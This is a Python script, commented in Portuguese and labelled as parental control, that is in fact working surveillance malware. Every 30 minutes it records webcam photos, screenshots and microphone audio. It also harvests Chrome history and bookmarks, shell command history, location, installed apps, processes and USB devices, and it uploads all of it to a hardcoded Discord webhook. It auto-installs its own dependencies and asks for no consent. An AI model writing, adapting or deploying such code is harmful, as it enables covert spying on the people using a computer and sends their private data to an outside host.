# ==================== AUTO-INSTALAÇÃO DE DEPENDÊNCIAS ====================
import subprocess
import sys

def instalar_dependencias():
    """Instala dependências automaticamente se não existirem."""
    dependencias = [
        "pillow",
        "opencv-python",
        "psutil",
        "sounddevice",
        "scipy",
        "numpy"
    ]
    
    print("[*] Verificando dependências...")
    
    for pacote in dependencias:
        try:
            if pacote == "pillow":
                __import__("PIL")
            elif pacote == "opencv-python":
                __import__("cv2")
            elif pacote == "sounddevice":
                __import__("sounddevice")
            elif pacote == "scipy":
                __import__("scipy")
            else:
                __import__(pacote)
            print(f"    [OK] {pacote}")
        except ImportError:
            print(f"    [!] Instalando {pacote}...")
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", pacote, "-q"
            ])
            print(f"    [OK] {pacote} instalado!")
    
    print("[+] Todas as dependências estão prontas!\n")

# Instala antes de importar
instalar_dependencias()

# ==================== IMPORTS ====================
import os
import time
import json
import sqlite3
import platform
import shutil
import ctypes
from datetime import datetime
from urllib.request import Request, urlopen
from PIL import ImageGrab
import cv2
import psutil
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np

# ==================== CONFIGURAÇÕES ====================
LOG_DIR = "logs"
REPORT_DIR = "relatorios"
AUDIO_DIR = "audios"
MAX_LOG_AGE_DAYS = 7
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"  # <- SUBSTITUI AQUI
INTERVALO_MINUTOS = 30
TEMPO_INICIO = time.time()

# ==================== SETUP ====================
def setup():
    """Cria pastas necessárias."""
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(REPORT_DIR, exist_ok=True)
    os.makedirs(AUDIO_DIR, exist_ok=True)
    print("[+] Pastas criadas.")

# ==================== FUNÇÕES AUXILIARES ====================
def salvar_txt(nome: str, dados: dict):
    """Salva dados em .txt"""
    try:
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        caminho = os.path.join(REPORT_DIR, f"{nome}_{ts}.txt")
        
        with open(caminho, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write(f"  {nome.upper()} - {ts}\n")
            f.write("=" * 60 + "\n\n")
            
            for chave, valor in dados.items():
                f.write(f">> {chave.upper()}\n")
                f.write("-" * 40 + "\n")
                if isinstance(valor, list):
                    for i, item in enumerate(valor, 1):
                        f.write(f"  {i}. {item}\n")
                elif isinstance(valor, dict):
                    for k, v in valor.items():
                        f.write(f"  * {k}: {v}\n")
                else:
                    f.write(f"  {valor}\n")
                f.write("\n")
        
        print(f"[+] Salvo: {caminho}")
        return caminho
    except Exception as e:
        print(f"[-] Erro: {e}")
        return None

def enviar_discord_texto(titulo: str, descricao: str):
    """Envia texto para Discord."""
    try:
        embed = {
            "embeds": [{
                "title": titulo,
                "description": descricao[:4000],
                "color": 3447003,
                "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                "footer": {"text": "Controle Parental"}
            }]
        }
        
        dados = json.dumps(embed).encode('utf-8')
        req = Request(DISCORD_WEBHOOK_URL, data=dados)
        req.add_header('Content-Type', 'application/json')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        response = urlopen(req, timeout=30)
        if response.status == 204:
            print("[+] Mensagem enviada ao Discord!")
            return True
        return False
    except Exception as e:
        print(f"[-] Erro Discord: {e}")
        return False

def enviar_discord_arquivo(arquivo: str, msg: str = ""):
    """Envia arquivo para Discord."""
    try:
        if not os.path.exists(arquivo):
            return False
        
        boundary = f"----WebKitFormBoundary{int(time.time())}"
        
        with open(arquivo, "rb") as f:
            conteudo = f.read()
        
        nome = os.path.basename(arquivo)
        ext = nome.split('.')[-1].lower()
        
        tipos = {'png': 'image/png', 'jpg': 'image/jpeg', 'jpeg': 'image/jpeg', 
                 'wav': 'audio/wav', 'txt': 'text/plain'}
        content_type = tipos.get(ext, 'application/octet-stream')
        
        body = b''
        if msg:
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="content"\r\n\r\n'
            body += msg.encode() + b'\r\n'
        
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{nome}"\r\n'.encode()
        body += f'Content-Type: {content_type}\r\n\r\n'.encode()
        body += conteudo + b'\r\n'
        body += f'--{boundary}--\r\n'.encode()
        
        req = Request(DISCORD_WEBHOOK_URL, data=body)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        response = urlopen(req, timeout=60)
        if response.status == 200:
            print(f"[+] Arquivo enviado: {nome}")
            return True
        return False
    except Exception as e:
        print(f"[-] Erro arquivo: {e}")
        return False

# ==================== 1. TEMPO DE USO ====================
def obter_tempo_uso():
    """Tempo de uso do PC."""
    try:
        tempo = time.time() - TEMPO_INICIO
        h, m, s = int(tempo//3600), int((tempo%3600)//60), int(tempo%60)
        
        boot = datetime.fromtimestamp(psutil.boot_time())
        desde_boot = str(datetime.now() - boot).split('.')[0]
        
        return {
            "sessao": f"{h}h {m}m {s}s",
            "desde_boot": desde_boot,
            "boot": boot.strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        return {"erro": str(e)}

# ==================== 2. ÁUDIO ====================
def capturar_audio(duracao=10):
    """Grava áudio do microfone."""
    try:
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        arquivo = os.path.join(AUDIO_DIR, f"audio_{ts}.wav")
        
        print(f"[+] Gravando {duracao}s de áudio...")
        audio = sd.rec(int(duracao * 44100), samplerate=44100, channels=1, dtype='int16')
        sd.wait()
        wav.write(arquivo, 44100, audio)
        
        print(f"[+] Áudio salvo: {arquivo}")
        return arquivo
    except Exception as e:
        print(f"[-] Erro áudio: {e}")
        return None

# ==================== 5. USB ====================
def listar_usb():
    """Lista dispositivos USB."""
    try:
        dispositivos = []
        if platform.system() == "Windows":
            result = subprocess.run(
                ["wmic", "path", "Win32_USBHub", "get", "DeviceID,Name"],
                capture_output=True, text=True, encoding='utf-8', errors='ignore'
            )
            dispositivos = [l.strip() for l in result.stdout.split('\n') if l.strip() and "DeviceID" not in l]
        else:
            result = subprocess.run(["lsusb"], capture_output=True, text=True)
            dispositivos = result.stdout.strip().split('\n')
        
        print(f"[+] USB: {len(dispositivos)}")
        return dispositivos[:30]
    except Exception as e:
        print(f"[-] Erro USB: {e}")
        return []

# ==================== 6. LOCALIZAÇÃO ====================
def obter_localizacao():
    """Localização via IP."""
    try:
        req = Request("http://ip-api.com/json/")
        req.add_header('User-Agent', 'Mozilla/5.0')
        response = urlopen(req, timeout=10)
        dados = json.loads(response.read().decode())
        
        if dados["status"] == "success":
            loc = {
                "ip": dados.get("query", "?"),
                "cidade": dados.get("city", "?"),
                "pais": dados.get("country", "?"),
                "isp": dados.get("isp", "?")
            }
            print(f"[+] Local: {loc['cidade']}, {loc['pais']}")
            return loc
        return {"erro": "Falha"}
    except Exception as e:
        print(f"[-] Erro local: {e}")
        return {"erro": str(e)}

# ==================== 9. PROCESSOS ====================
def listar_processos():
    """Lista processos ativos."""
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = p.info
                if info['memory_percent'] and info['memory_percent'] > 0.1:
                    procs.append(f"{info['name']} (PID:{info['pid']}) RAM:{info['memory_percent']:.1f}%")
            except:
                continue
        
        procs.sort(key=lambda x: float(x.split('RAM:')[1].replace('%','')), reverse=True)
        print(f"[+] Processos: {len(procs)}")
        return procs[:50]
    except Exception as e:
        print(f"[-] Erro procs: {e}")
        return []

# ==================== 10. TERMINAL ====================
def obter_historico_terminal():
    """Histórico do terminal."""
    try:
        comandos = []
        if platform.system() == "Windows":
            hist = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
            if os.path.exists(hist):
                with open(hist, "r", encoding="utf-8", errors="ignore") as f:
                    comandos = [c.strip() for c in f.readlines()[-100:] if c.strip()]
        else:
            for h in ["~/.bash_history", "~/.zsh_history"]:
                path = os.path.expanduser(h)
                if os.path.exists(path):
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        comandos.extend([c.strip() for c in f.readlines()[-100:] if c.strip()])
        
        print(f"[+] Comandos: {len(comandos)}")
        return comandos
    except Exception as e:
        print(f"[-] Erro terminal: {e}")
        return []

# ==================== 12. SISTEMA ====================
def obter_info_sistema():
    """Info do sistema."""
    try:
        mem = psutil.virtual_memory()
        disco = psutil.disk_usage('/')
        bat = psutil.sensors_battery()
        
        info = {
            "so": f"{platform.system()} {platform.release()}",
            "hostname": platform.node(),
            "usuario": os.getlogin() if hasattr(os, 'getlogin') else os.environ.get("USER", "?"),
            "cpu": f"{psutil.cpu_percent()}%",
            "ram": f"{mem.percent}%",
            "ram_total": f"{mem.total/1024**3:.1f}GB",
            "disco": f"{disco.percent}%",
            "disco_total": f"{disco.total/1024**3:.1f}GB",
            "bateria": f"{bat.percent}%" if bat else "N/A",
            "carregando": "Sim" if bat and bat.power_plugged else "Não" if bat else "N/A"
        }
        print("[+] Info sistema obtida")
        return info
    except Exception as e:
        print(f"[-] Erro sistema: {e}")
        return {"erro": str(e)}

# ==================== 15. FAVORITOS ====================
def obter_favoritos():
    """Favoritos do Chrome."""
    try:
        favoritos = []
        if platform.system() == "Windows":
            path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
        else:
            path = os.path.expanduser("~/.config/google-chrome/Default/Bookmarks")
        
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                dados = json.load(f)
                
                def extrair(node):
                    r = []
                    if isinstance(node, dict):
                        if node.get("type") == "url":
                            r.append(f"{node.get('name','?')[:35]} - {node.get('url','')[:50]}")
                        for c in node.get("children", []):
                            r.extend(extrair(c))
                    return r
                
                for k in dados.get("roots", {}):
                    favoritos.extend(extrair(dados["roots"][k]))
        
        print(f"[+] Favoritos: {len(favoritos)}")
        return favoritos[:100]
    except Exception as e:
        print(f"[-] Erro favoritos: {e}")
        return []

# ==================== CAPTURAS ====================
def capturar_tela():
    """Screenshot."""
    try:
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        arquivo = os.path.join(REPORT_DIR, f"tela_{ts}.png")
        ImageGrab.grab().save(arquivo)
        print(f"[+] Tela: {arquivo}")
        return arquivo
    except Exception as e:
        print(f"[-] Erro tela: {e}")
        return None

def capturar_camera():
    """Foto da câmera."""
    try:
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        arquivo = os.path.join(REPORT_DIR, f"camera_{ts}.jpg")
        
        print("[+] Abrindo câmera...")
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            print("[-] Câmera não disponível")
            return None
        
        time.sleep(2)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite(arquivo, frame)
            print(f"[+] Câmera: {arquivo}")
            return arquivo
        return None
    except Exception as e:
        print(f"[-] Erro câmera: {e}")
        return None

def obter_historico_navegador():
    """Histórico do Chrome."""
    try:
        historico = []
        if platform.system() == "Windows":
            path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
        else:
            path = os.path.expanduser("~/.config/google-chrome/Default/History")
        
        if os.path.exists(path):
            temp = os.path.join(REPORT_DIR, "temp_hist.db")
            shutil.copy2(path, temp)
            
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch')
                FROM urls ORDER BY last_visit_time DESC LIMIT 100
            """)
            
            for url, titulo, data in cursor.fetchall():
                historico.append(f"[{data}] {(titulo or '?')[:35]} - {url[:50]}")
            
            conn.close()
            os.remove(temp)
        
        print(f"[+] Histórico: {len(historico)}")
        return historico
    except Exception as e:
        print(f"[-] Erro histórico: {e}")
        return []

def obter_apps():
    """Apps instaladas."""
    try:
        apps = []
        if platform.system() == "Windows":
            import winreg
            for path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                            nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if nome: apps.append(nome)
                        except: pass
                except: pass
        else:
            result = subprocess.run(["dpkg", "--list"], capture_output=True, text=True)
            for l in result.stdout.split('\n')[5:]:
                p = l.split()
                if len(p) >= 2: apps.append(p[1])
        
        apps = list(set(apps))[:300]
        print(f"[+] Apps: {len(apps)}")
        return apps
    except Exception as e:
        print(f"[-] Erro apps: {e}")
        return []

def limpar_antigos():
    """Remove logs antigos."""
    try:
        limite = time.time() - (MAX_LOG_AGE_DAYS * 86400)
        for pasta in [LOG_DIR, REPORT_DIR, AUDIO_DIR]:
            if os.path.exists(pasta):
                for arq in os.listdir(pasta):
                    cam = os.path.join(pasta, arq)
                    if os.path.getmtime(cam) < limite:
                        os.remove(cam)
    except: pass

# ==================== MONITORAMENTO ====================
def executar():
    """Executa monitoramento."""
    print("\n" + "=" * 60)
    print(f"  MONITORAMENTO - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    # Coleta
    tempo = obter_tempo_uso()
    local = obter_localizacao()
    sistema = obter_info_sistema()
    usb = listar_usb()
    procs = listar_processos()
    terminal = obter_historico_terminal()
    favoritos = obter_favoritos()
    historico = obter_historico_navegador()
    apps = obter_apps()
    
    # Capturas
    print("\n[*] Capturas...")
    camera = capturar_camera()
    tela = capturar_tela()
    audio = capturar_audio(10)
    
    # Salvar .txt
    print("\n[*] Salvando relatórios...")
    arquivos = []
    
    if historico:
        a = salvar_txt("historico", {"sites": historico})
        if a: arquivos.append(a)
    if apps:
        a = salvar_txt("apps", {"instaladas": apps})
        if a: arquivos.append(a)
    if procs:
        a = salvar_txt("processos", {"ativos": procs})
        if a: arquivos.append(a)
    if terminal:
        a = salvar_txt("terminal", {"comandos": terminal})
        if a: arquivos.append(a)
    if favoritos:
        a = salvar_txt("favoritos", {"bookmarks": favoritos})
        if a: arquivos.append(a)
    if usb:
        a = salvar_txt("usb", {"dispositivos": usb})
        if a: arquivos.append(a)
    
    # Resumo
    resumo = {
        "tempo": tempo,
        "local": local,
        "sistema": sistema,
        "totais": {
            "historico": len(historico),
            "apps": len(apps),
            "processos": len(procs),
            "comandos": len(terminal),
            "favoritos": len(favoritos),
            "usb": len(usb)
        }
    }
    a = salvar_txt("resumo", resumo)
    if a: arquivos.append(a)
    
    # Discord
    print("\n[*] Enviando para Discord...")
    
    titulo = f"Monitoramento - {datetime.now().strftime('%d/%m %H:%M')}"
    desc = f"""
**Tempo**
Sessão: {tempo.get('sessao','?')} | Boot: {tempo.get('desde_boot','?')}

**Local**
{local.get('cidade','?')}, {local.get('pais','?')} | IP: {local.get('ip','?')}

**Sistema**
{sistema.get('so','?')} | User: {sistema.get('usuario','?')}
CPU: {sistema.get('cpu','?')} | RAM: {sistema.get('ram','?')} | Disco: {sistema.get('disco','?')}
Bateria: {sistema.get('bateria','?')} ({sistema.get('carregando','?')})

**Totais**
Histórico: {len(historico)} | Apps: {len(apps)} | Processos: {len(procs)}
Comandos: {len(terminal)} | Favoritos: {len(favoritos)} | USB: {len(usb)}
"""
    
    enviar_discord_texto(titulo, desc)
    time.sleep(1)
    
    if camera:
        enviar_discord_arquivo(camera, "**FOTO CAMERA** - Quem está no PC:")
        time.sleep(1)
    
    if tela:
        enviar_discord_arquivo(tela, "**SCREENSHOT**")
        time.sleep(1)
    
    if audio:
        enviar_discord_arquivo(audio, "**AUDIO** (10s)")
        time.sleep(1)
    
    for a in arquivos:
        enviar_discord_arquivo(a)
        time.sleep(0.5)
    
    limpar_antigos()
    
    print("\n" + "=" * 60)
    print("  CONCLUÍDO!")
    print("=" * 60 + "\n")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║           CONTROLE PARENTAL - AUTO INSTALÁVEL              ║
    ╠════════════════════════════════════════════════════════════╣
    ║  • Tempo de uso        • Screenshot                        ║
    ║  • Áudio ambiente      • Foto da câmera                    ║
    ║  • Dispositivos USB    • Histórico navegador               ║
    ║  • Localização IP      • Apps instaladas                   ║
    ║  • Processos ativos    • Favoritos                         ║
    ║  • Histórico terminal                                      ║
    ╠════════════════════════════════════════════════════════════╣
    ║  As dependências serão instaladas automaticamente!         ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    setup()
    executar()
    
    print(f"[*] Próxima execução em {INTERVALO_MINUTOS} minutos...")
    print("[*] Ctrl+C para parar\n")
    
    while True:
        time.sleep(INTERVALO_MINUTOS * 60)
        executar()
